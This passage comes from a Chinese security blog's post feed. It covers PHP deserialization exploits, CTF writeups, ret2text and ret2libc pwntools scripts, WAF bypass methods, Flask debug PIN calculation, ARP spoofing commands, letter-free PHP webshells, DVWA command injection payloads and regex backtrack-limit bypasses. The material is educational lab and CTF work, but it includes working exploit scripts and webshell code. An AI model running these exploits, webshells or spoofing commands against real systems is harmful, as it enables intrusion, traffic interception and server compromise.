    <content type="text"><![CDATA[通常反序列化的攻击是在魔术方法中出现一些可利用的漏洞，通过自动调用来触发漏洞。 但是如果关键代码不在魔术方法中，而是在一个类的普通方法中。这个时候我们可以通过寻找相同的函数名将类的属性和敏感函数联系起来 借用网上的代码： &lt;?php class lemon { protected $ClassObj; function __construct() { $this-&gt;ClassObj = new normal(); } function __destruct() { $this-&gt;ClassObj-&gt;action(); } } class normal { function action() { echo &quot;hello&quot;; } } class evil { private $data; function action() { eval($this-&gt;data); } } unserialize($_GET[&apos;d&apos;]); 其中类normal 和 evil同时拥有action方法，并且evil中的方法是可控的，我们可以通过反序列化来掉用evil类中的action方法 exp: &lt;?php class lemon { protected $ClassObj; function __construct() { $this-&gt;ClassObj = new evil(); } function __destruct() { $this-&gt;ClassObj-&gt;action(); } } class normal { function action() { echo &quot;hello&quot;; } } class evil { private $data = &quot;phpinfo();&quot;; function action() { eval($this-&gt;data); } } $a = new lemon(); echo urlencode(serialize($a)); 会生成这样一段payload O%3A5%3A%22lemon%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D 用get方式传入 可以看到成功进行了利用]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HGAME 2019-week1 writeup]]></title>
    <url>%2F2019%2F01%2F26%2FHGAME-2019-week1-writeup%2F</url>
    <content type="text"><![CDATA[web谁吃了我的flag题目是考察备份文件的恢复，将.index.html.swp下载下来，然后使用命令vim -r index.html即可恢复文件查看到flag 换头大作战在响应头出多次按照提示变换，最后得到flag very easy web题目代码如下 &lt;?php error_reporting(0); include(&quot;flag.php&quot;); if(strpos(&quot;vidar&quot;,$_GET[&apos;id&apos;])!==FALSE) die(&quot;&lt;p&gt;干巴爹&lt;/p&gt;&quot;); $_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]); if($_GET[&apos;id&apos;] === &quot;vidar&quot;) { echo $flag; } highlight_file(__FILE__); ?&gt; 可以看到在代码中间有这么一句 $_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]); 将参数进行了URL解码，而我们知道除了这个解码外，浏览器额外还会进行解码，所以我们需要将参数进行两次URL编码，同时自然绕过strpos函数 加密网址：http://web.chacuo.net/charseturlencode can u find me?f12查看源码，发现了f12.php 访问后提示让我们post一个密码，随便post一个密码，可以在返回包中看到真实的密码 输入后再次抓包即可得到flag REHelloRe打开发现是ELF文件，使用strings命令查看字符串发现flag Pro的Python教室(一)代码如下 import base64 import hashlib enc1 = &apos;hgame{&apos; enc2 = &apos;SGVyZV8xc18zYXN5Xw==&apos; enc3 = &apos;Pyth0n}&apos; print &apos;Welcome to Processor\&apos;s Python Classroom!\n&apos; print &apos;Here is Problem One.&apos; print &apos;There\&apos;re three parts of the flag.&apos; print &apos;------------------------------------------------&apos; print &apos;Plz input the first part:&apos; first = raw_input() if first == enc1: pass else: print &apos;Sorry , You\&apos;re so vegatable!&apos; exit() print &apos;Plz input the secend part:&apos; secend = raw_input() secend = base64.b64encode(secend) if secend == enc2: pass else: print &apos;Sorry , You\&apos;re so vegatable!&apos; exit() print &apos;Plz input the third part:&apos; third = raw_input() third = base64.b32decode(third) if third == enc3: pass else: print &apos;Sorry , You\&apos;re so vegatable!&apos; exit() print &apos;Oh, You got it !&apos; 直接将SGVyZV8xc18zYXN5Xw==base64解码后拼接成flag就可以了 PWNaaaaaaaaaa使用IDA打开查看 int __cdecl main(int argc, const char **argv, const char **envp) { signed int v3; // eax signed int v5; // [rsp+Ch] [rbp-4h] setbuf(_bss_start, 0LL); signal(14, handle); alarm(0xAu); puts(&quot;Welcome to PWN&apos;world!let us aaaaaaaaaa!!!&quot;); v5 = 0; while ( 1 ) { v3 = v5++; if ( v3 &gt; 99 ) break; if ( getchar() != 97 ) exit(0); } system(&quot;/bin/sh&quot;); return 0; } 我们发送100个a就可以了 exp: from pwn import * #p = process(&apos;./a&apos;) p = remote(&apos;118.24.3.214&apos;,9999) p.sendlineafter(&apos;!!!&apos;,&apos;a&apos;*100) p.interactive() MISCBroken Chest打开发现压缩包是损坏的，修复一下文件头，然后用注释的字符串作为密码，得到flag Try在流量包中提取到一个压缩包，其中有一passWord文件，提示hgame**，想到掩码攻击，爆破得到密码解压 又得到一张图片，使用foremost分离出Word文件，打开得到flag CRYPTOMIX题目给了以下代码 --.../....-/....-/-.../--.../...--/...../..-./-..../-../-..../..-./--.../----./....-/....-/--.../.----/-..../-.../--.../-.../-..../..---/...../.----/-..../-..../...--/....-/...--/-----/-..../...../--.../-.. 感觉像是摩斯码，将/替换成空格，即可得到flag Base全家手动测试 import base64 import requests url = &quot;http://plir4axuz.bkt.clouddn.com/hgame2019/enc.txt&quot; html = requests.get(url) result = html.text result = base64.b64decode(result) result = base64.b64decode(result) result = base64.b16decode(result) result = base64.b16decode(result) result = base64.b16decode(result) result = base64.b32decode(result) result = base64.b16decode(result) result = base64.b32decode(result) result = base64.b64decode(result) result = base64.b16decode(result) result = base64.b64decode(result) result = base64.b16decode(result) result = base64.b16decode(result) result = base64.b16decode(result) result = base64.b16decode(result) result = base64.b32decode(result) result = base64.b64decode(result) result = base64.b64decode(result) result = base64.b64decode(result) result = base64.b32decode(result) print(result) 得到结果： base58 : 2BAja2VqXoHi9Lo5kfQZBPjq1EmZHGEudM5JyDPREPmS3CxrpB8BnC 在github上搜到了第三方库，下载使用解密即可 https://github.com/keis/base58]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Waf那些事]]></title>
    <url>%2F2019%2F01%2F25%2FWaf%E9%82%A3%E4%BA%9B%E4%BA%8B%2F</url>
    <content type="text"><![CDATA[介绍wafWaf是Web应用防火墙通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品 Waf通常有以下几类： 软件型waf以软件形式装在所保护的服务器上的waf，由于安装在服务器上，所以可以接触到服务器上的文件，直接检测服务器上是否存在webshell，是否有文件被创建等。 硬件型waf以硬件形式部署在线路中，支持多种部署方式，当串联到链路中时可以拦截恶意流量，在旁路监听模式时只记录攻击不进行拦截。 云waf一般以反向代理的形式工作，通过配置NS记录或CNAME记录，使对网站的请求报文优先经过waf主机，经过waf主机的过滤后，将认为无害的请求报文再发送给实际网站服务器进行请求，可以说是带防护功能的CDN 网站系统内置的waf网站系统内置的waf可以说是网站内置的过滤，直接镶嵌在代码中，相对来说自由度高，一般有以下几种情况： 输入参数强制类型转换 输入参数合法性检测 关键函数执行前，对经过代码流程的输入进行检测 对输入的数据进行替换后在继续执行代码流程 网站系统内置的waf与业务更加契合，在对安全与业务都比较了解的情况下，可以更少的收到误报与漏报。 waf判断判断网站是否存在waf主要有下面几种方法： sqlmap使用sqlmap自带的waf识别模块可以识别出waf的种类，想要了解详细的识别规则可以查看sqlmap的waf目录下的相关脚本，也可以按照其格式自主添加新的waf识别规则，写好规则文件后直接放到waf目录下即可 手工判断这个也比较简单，直接在相应网站的URL后面加上最基础的测试语句，比如union select 1,2,3%23 ,并且放在一个不存在的参数名中。 被拦截的表现为：页面无法访问，响应码不同，返回与正常请求网页时不同的结果等。 一些waf的绕过方法大小写混合在规则匹配时只针对了特定大写或特定小写的情况，在实战中可以通过混合大小写的方式进行绕过（现在几乎没有这样的情况） URL编码 极少数的waf不会对普通字符进行URL解码 还有一种情况就是URL二次编码，waf一般只进行一次解码，如果目标web系统的代码中进行了额外的URL解码，即可进行绕过。 替换关键字waf采用替换或者删除select/union这类敏感关键词的时候，如果只匹配一次则很容易绕过。 使用注释注释在截断sql语句中用的比较多，在绕过waf时主要使用其代替空格（/**/），适用于检测过程中没有识别注释或者替换掉了注释的waf。 多参数请求拆分对于多个参数拼接到同一条sql语句中的情况，可以将注入语句分割插入。 生僻函数使用生僻函数替代常见的函数，例如在报错注入中使用polygon()函数替换常用的updatexml()函数 寻找网站源站ip对于有云waf防护的网站而言，只要找到网站的ip地址，然后通过ip访问网站，就可以绕过云waf检测 常见的寻找网站ip的方法如下: 寻找网站的历史解析记录 多个不同区域ping网站，查看ip解析结果 寻找网站二级域名，NX，MX记录对应的ip 订阅网站邮件，查看邮件发送方的ip]]></content>
      <tags>
        <tag>读书心得</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn学习笔记-ret2libc3]]></title>
    <url>%2F2019%2F01%2F24%2Fpwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2libc3%2F</url>
    <content type="text"><![CDATA[在ret2libc2的基础上，将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护 程序仍然开启了NX 拖入ida中查看 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No surprise anymore, system disappeard QQ.&quot;); printf(&quot;Can you find it !?&quot;); gets(&amp;s); return 0; } 仍然是在gets函数处利用，但是在程序中现在没有了system函数和/bin/sh字符串 这里就需要了解一下libc的作用 system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序开启了ALSR，但是程序的低3位地址是不会变的，我们可以泄露出某个执行过的函数的低三位地址进而确定libc的版本 泄露某个函数的地址我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。 脚本如下： from pwn import * context.log_level = &apos;debug&apos; p = process(&apos;./ret2libc3&apos;) elf = ELF(&apos;./ret2libc3&apos;) p.sendlineafter(&apos;!?&apos;,&apos;a&apos;*112+p32(elf.plt[&apos;puts&apos;])+&apos;aaaa&apos;+p32(elf.got[&apos;puts&apos;])) p.interactive() 我们可以通过此处泄露puts函数的地址 可以看到地址的低三位为ca0 下面我们可以确定libc的版本，我们可以用到LibcSearcher github地址为https://github.com/lieanu/LibcSearcher 当然这个工具的强大之处不只如此，我们可以把它当做第三方库来使用 引用说明文档的例子 from LibcSearcher import * #第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型 obj = LibcSearcher(&quot;fgets&quot;, 0X7ff39014bd90) obj.dump(&quot;system&quot;)#system 偏移 obj.dump(&quot;str_bin_sh&quot;)#/bin/sh 偏移 obj.dump(&quot;__libc_start_main_ret&quot;) 所以得到了libc的版本后，我们就可以获得libc中system函数和/bin/sh的地址 将LibcSearcher作为第三方库，最后的脚本为： from pwn import * from LibcSearcher import LibcSearcher p = process(&apos;./ret2libc3&apos;) elf = ELF(&apos;./ret2libc3&apos;) p.sendlineafter(&apos;!?&apos;,&apos;a&apos;*112+p32(elf.plt[&apos;puts&apos;])+p32(0x08048618)+p32(elf.got[&apos;puts&apos;])) puts_addr = u32(p.recv(4)) libc = LibcSearcher(&apos;puts&apos;,puts_addr) libc_base = puts_addr - libc.dump(&apos;puts&apos;) system_addr = libc_base + libc.dump(&apos;system&apos;) binsh = libc_base + libc.dump(&apos;str_bin_sh&apos;) p.sendlineafter(&apos;!?&apos;,&apos;a&apos;*112+p32(system_addr)+p32(0x08048618)+p32(binsh)) p.interactive() 调用完puts函数后我们让该函数返回到程序的主函数处脚本执行需要等待一会，可能是寻找libc较费时间 成功获得了shell]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn学习笔记-ret2libc2]]></title>
    <url>%2F2019%2F01%2F23%2Fpwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2libc2%2F</url>
    <content type="text"><![CDATA[查看程序保护机制 拖入ida查看 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;Something surprise here, but I don&apos;t think it will work.&quot;); printf(&quot;What do you think ?&quot;); gets(&amp;s); return 0; } 和ret2libc1一样，都是通过gets函数进行攻击 查看程序是否存在system 函数 void secure() { unsigned int v0; // eax int input; // [esp+18h] [ebp-10h] int secretcode; // [esp+1Ch] [ebp-Ch] v0 = time(0); srand(v0); secretcode = rand(); __isoc99_scanf((const char *)&amp;unk_8048760, &amp;input); if ( input == secretcode ) system(&quot;no_shell_QQ&quot;); } 寻找是否有/bin/sh字符串，但是该程序中并不存在 这里就涉及到了最基本的ROP技术 所以需要我们自己来读取字符串，我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”) exp: from pwn import * rop = ROP(&apos;./ret2libc2&apos;) p = process(&apos;./ret2libc2&apos;) elf = ELF(&apos;./ret2libc2&apos;) p.sendline(&apos;a&apos;*112+p32(elf.plt[&apos;gets&apos;])+p32(rop.search(8).address)+p32(elf.bss()+0x100)+p32(elf.plt[&apos;system&apos;])+&apos;aaaa&apos;+p32(elf.bss()+0x100)) p.sendline(&apos;/bin/sh&apos;) p.interactive() 其中 rop.search(8).address 是pwntools自带寻找gadgets的方法 成功获得权限]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn学习笔记-ret2libc1]]></title>
    <url>%2F2019%2F01%2F22%2Fpwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2libc1%2F</url>
    <content type="text"><![CDATA[试着运行程序 程序只有一个输入点，检查程序 程序开启了NX，拖进ida查看 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;RET2LIBC &gt;_&lt;&quot;); gets(&amp;s); return 0; } 这里同样有gets函数，并且经检测需覆盖字符仍为112 发现了内置的system函数 void secure() { unsigned int v0; // eax int input; // [esp+18h] [ebp-10h] int secretcode; // [esp+1Ch] [ebp-Ch] v0 = time(0); srand(v0); secretcode = rand(); __isoc99_scanf(&quot;%d&quot;, &amp;input); if ( input == secretcode ) system(&quot;shell!?&quot;); } 但是并没有/bin/sh ,接着在ida中寻找/bin/sh 可以看到在0x08048720处存在/bin/sh 下面就可以构造exp了 from pwn import * p = process(&apos;./ret2libc1&apos;) elf = ELF(&apos;./ret2libc1&apos;) p.sendline(&apos;a&apos;*112+p32(elf.plt[&apos;system&apos;])+&apos;aaaa&apos;+p32(0x08048720)) p.interactive() 其中 &apos;a&apos;*112+p32(elf.plt[&apos;system&apos;])+&apos;aaaa&apos;+p32(0x08048720) 这里的aaaa是执行system后的返回地址，因为执行完system后我们就获取了shell，所以返回地址就用不到了，可以随意写 可以看到成功获得了shell]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn学习笔记-ret2text]]></title>
    <url>%2F2019%2F01%2F21%2Fpwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ret2text%2F</url>
    <content type="text"><![CDATA[查看程序基本信息 开启了NX，代表着栈上的数据是不可执行的 运行程序看一下 程序只有一个输入点，下面将程序拖入ida int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;There is something amazing here, do you know anything?&quot;); gets(&amp;s); printf(&quot;Maybe I will tell you next time !&quot;); return 0; } 看到了无输入限制的gets函数，我们接下来计算一下程序gets函数的返回地址 可以看到地址是0x62616164，下面计算我们需要填充的字节数 需要填充112个无用字符 接下来我们在ida中查看是否存在/bin/sh 在地址0x0804863A处存在/bin/sh 接下来编写shell脚本 from pwn import * p = process(&quot;./ret2text&quot;) p.recvuntil(&apos;anything?\n&apos;) p.sendline(&apos;a&apos;*112+p32(0x0804863A)) p.interactive() 成功获得权限]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[flask debug模式下pin码安全]]></title>
    <url>%2F2019%2F01%2F20%2Fflask-debug%E6%A8%A1%E5%BC%8F%E4%B8%8Bpin%E7%A0%81%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[flask在开启debug模式时其会生成一个pin码，在同一台机器上，多次重启Flask服务，PIN码值不改变。 这说明PIN码是经过运算生成而不是随机生成的，经过网络搜索，我找到了生成pin 码的流程，生成的pin 码主要由6个值决定的 当前计算机的用户名 flask.app Flask E:\flask-file\flask\lib\site-packages\flask\app.py 当前计算机网卡的Mac地址(linux下获取该值可以访问：/sys/class/net/eth0(eth1,ens33,eth2)/address) win下SOFTWARE\Microsoft\Cryptography注册表的值或者Linux下某个固定文件的值（Linux下访问/etc/machine-id 或 /proc/sys/kernel/random/boot_id） 在默认配置里找到代码并将其修改，得到猜解pin码的脚本 import hashlib from itertools import chain def get_pin(mac): probably_public_bits = [ &apos;SUN&apos;,# username &apos;flask.app&apos;,# modname &apos;Flask&apos;,# getattr(app, &apos;__name__&apos;, getattr(app.__class__, &apos;__name__&apos;)) &apos;E:\\flask-file\\flask\\lib\\site-packages\\flask\\app.py&apos; # getattr(mod, &apos;__file__&apos;, None), ] private_bits = [ mac ,#&apos;55069833074577&apos;,# str(uuid.getnode()), /sys/class/net/eth0(eth1,ens33,eth2)/address &apos;2aa76823-5ed2-44aa-97de-ac3f97b955e2&apos;# get_machine_id(), /etc/machine-id , /proc/sys/kernel/random/boot_id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&apos;utf-8&apos;) h.update(bit) h.update(b&apos;cookiesalt&apos;) cookie_name = &apos;__wzd&apos; + h.hexdigest()[:20] num = None if num is None: h.update(b&apos;pinsalt&apos;) num = (&apos;%09d&apos; % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &apos;-&apos;.join(num[x:x + group_size].rjust(group_size, &apos;0&apos;) for x in range(0, len(num), group_size)) break else: rv = num print(rv) if __name__ == &apos;__main__&apos;: maclist = [&apos;55069833074577&apos;,&apos;1099493587180&apos;,&apos;115366132066698&apos;,&apos;117565155322249&apos;,&apos;345052807176&apos;,&apos;115366132066697&apos;] for mac in maclist: get_pin(mac) 这里用本地环境验证一下 故意将代码写错以触发debug模式 点击最右侧的小图标会让我们输入pin码 现在我们开始计算PIN码 用户名：SUN flask.app Flask E:\flask-file\flask\lib\site-packages\flask\app.py [‘55069833074577’,’1099493587180’,’115366132066698’,’117565155322249’,’345052807176’,’115366132066697’] 2aa76823-5ed2-44aa-97de-ac3f97b955e2 运行脚本会计算出6个pin 码 231-484-767 177-131-120 142-563-096 112-007-296 244-772-099 236-421-014 经过测试,244-772-099是正确的pin码 linux下调试可用： import os os.popen(&quot;ls /&quot;).read() 这里有几个坑需要注意一下： E:\flask-file\flask\lib\site-packages\flask\app.py windows下是不区分大小写的，有时应将路径的大写字母改为小写字母 E:\flask-file\flask\lib\site-packages\flask\app.py 这个路径有时也会是E:\flask-file\flask\lib\site-packages\flask\app.pyc Linux下，第六个数值在获取时，当/etc/machine-id文件显示无任何内容时，可能是该文件为空或者是不存在，这两者是有区别的，当该文件为空时，第六个数值就是“” 而当文件不存在时，第六个数值是/proc/sys/kernel/random/boot_id文件的值]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ARP欺骗原理及实例]]></title>
    <url>%2F2019%2F01%2F19%2FARP%E6%AC%BA%E9%AA%97%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[arp协议简介arp是一种地址转换协议，在以太网中，网络设备之间相互通信是用Mac地址进行数据交流，而arp协议就是吧IP地址转换成Mac地址的 arp欺骗原理每台机器都会有一张arp缓存表，缓存表记录了ip地址与Mac地址的对应关系，在同一局域网中，A主机与B主机通信需要经过网关，但是arp缓存表存在一个缺陷，当主机收到arp应答包后，不会验证自己是否向对方主机发送过arp请求包，而是直接将返回包中的ip和Mac地址对应的关系添加到arp缓存表中。 实例复现这里使用一台winxp和kali虚拟机 ip分别是192.168.18.131,192.168.18.135 这里我们为的是侦测到目标机的某些网络活动，所以在开始欺骗之前需要开启ip转发，不然在操作时目标主机会出现断网的情况 echo 1 &gt; /proc/sys/net/ipv4/ip_forward kali下arp攻击工具是arpspoof，具体的命令可在百度上查询到或者使用arpspoof -h 查看口令 arpspoof -i eth0 -t 192.168.18.131 192.168.18.135 开始修改目标机上的缓存表 开始嗅探目标机上的网络活动 dsniff -i eth0 这就完成了一次arp欺骗攻击，我们就可以捕捉到目标机的网络活动了]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无数字和字母的webshell]]></title>
    <url>%2F2019%2F01%2F18%2F%E6%97%A0%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell%2F</url>
    <content type="text"><![CDATA[先看一下这个例子 &lt;?php if(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) { eval($_GET[&apos;shell&apos;]); } 这算是一个极限利用了，要求我们不用数字和字母构造webshell 这样的问题我们可以类比于各类变形的一句话木马，用异或的方式得到一个新的字符，这时我们就可以用非数字和字母的字符串将数字或者字母异或出来 异或例如这个 &lt;?php $_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;); // $_=&apos;assert&apos;; $__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;; $___=$$__; $_($___[_]); // assert($_POST[_]); 部分数字是由于URL编码的原因，实际上是不包含数字的 取反运算还有一种方法我们可以使用~取反运算 例如这个 &lt;?php $__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;); $_=$__/$__; $____=&apos;&apos;; $___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__}); $_____=&apos;_&apos;;$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_}); $_=$$_____; $____($_[_]);// assert($_POST[_]); 原理就是用UTF-8编码的汉字，将其中的某个字符取出，然后取反，就可以得到想要的字母 自增运算例如这个 &lt;?php @$_=[].&apos;&apos;; @$___=$_[&apos;&apos;]; $_=$___;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__; $__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; $____=&apos;_&apos;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____; @$___($_[_]);// assert($_POST[_]); ?&gt; 我们可以拿到一个为a的变量，通过自增操作，即可获得a-z的任意一个字符，’a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’,’c’++ =&gt; ‘d’ 而在PHP中，数组和字符串若强制连接的话，数组也就会转换成字符串，即array 所以我们取字符串的第一个字母就可以得到a了]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令执行漏洞小结]]></title>
    <url>%2F2019%2F01%2F17%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[当应用程序调用一些可执行命令的函数，如PHP中 eval assert systempreg_replace call_user_func 等等函数，当函数参数变成可控参数时就可以将恶意的命令拼接到正常命令中，造成命令执行 这里在本地搭建了dvwa 环境进行漏洞的测试 进入命令执行测试界面 输入点输入ip可以执行ping命令 接下来看一下源代码(low) &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $target = $_REQUEST[ &apos;ip&apos; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int&apos;s put the IP back together. $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } else { // Ops. Let the user name theres a mistake echo &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 代码对于输入的命令没有温和过滤，可以利用管道符来执行我们想执行的命令 Linux常见的管道符这里也做一下总结： “；”：执行完前面的语句在执行后面的 “|”：显示后面语句的执行结果 “||”：当前面语句执行出错时，执行后面的语句 “&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 “&amp;&amp;”：如果前面的语句为假则直接出错，不执行后面的，前面的语句只能为真 这里我们输入127.0.0.1|whoami 成功的执行了“|”后面的命令 然后分别查看medium和high级别的黑名单代码段 可以看到medium等级只过滤了“&amp;&amp;”和“；” ，我们仍然可以用“|”绕过 对于high等级，我们可以用127.0.0.1&amp;|&amp;whoami进行绕过 命令执行常出现在可以执行某些命令的模块，并且该模块具有可控的输入点，如果过滤做的没有那么完整，很可能触发命令执行漏洞 几点避免命令执行漏洞的建议 尽量不要使用命令执行函数 客户端提交的变量在进入命令执行函数前要做好过滤和检测 对于PHP语言，不能完全控制的危险函数最好不要用]]></content>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[file_put_contents()的妙用]]></title>
    <url>%2F2019%2F01%2F16%2Ffile-put-contents-%E7%9A%84%E5%A6%99%E7%94%A8%2F</url>
    <content type="text"><![CDATA[今天偶然在群里看到这个骚操作 file_put_contents()第二个参数是可以传入数组的，那么在存在某些正则校验的时候，就可能带来绕过的可能 例如有如下代码 &lt;?php $text = $_GET[&apos;text&apos;]; if(preg_match(&apos;[&lt;&gt;?]&apos;, $text)) { die(&apos;fuck!!!!&apos;); } file_put_contents(&apos;shell.php&apos;, $text); 如果我们想写入一个php文件,正常的话传入 text = &lt;?php phpinfo(); 会被正则匹配到，无法写入 如果我们将本段代码以数组的形式传入，数组会强制转化为字符串，这样就绕过了正则的匹配，达到了getshell的目的 虽然出现了Warning，但是文件是被写入了的]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP利用回溯次数限制绕过]]></title>
    <url>%2F2019%2F01%2F15%2FPHP%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[回溯绕过这里以i春秋圣诞欢乐赛中一道题为例代码如下 &lt;?php function areyouok($greeting){ return preg_match(&apos;/Merry.*Christmas/is&apos;,$greeting); } $greeting=@$_POST[&apos;greeting&apos;]; if(!areyouok($greeting)){ if(strpos($greeting,&apos;Merry Christmas&apos;)!==false){ echo &apos;Merry Christmas. &apos;.&apos;flag{259efcb4-bb57-4967-8aa8-8271f04f655a}&apos;; }else{ echo &apos;Do you know .swp file?&apos;; } }else{ echo &apos;Do you know PHP?&apos;; } ?&gt; 题目虽然有更简单的解法，但是为了说明问题，我们来讨论如何绕过正则 PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限，这个上限默认是100万 所以当我们向其发送100万个a然后在发送Merry Christmas就可以绕过正则的校验，函数会返回NULL，也就符合了题目要求 什么是正则表达式比较规范的说法是：正则表达式是一个可以被“有限状态自动机”接受的语言类。 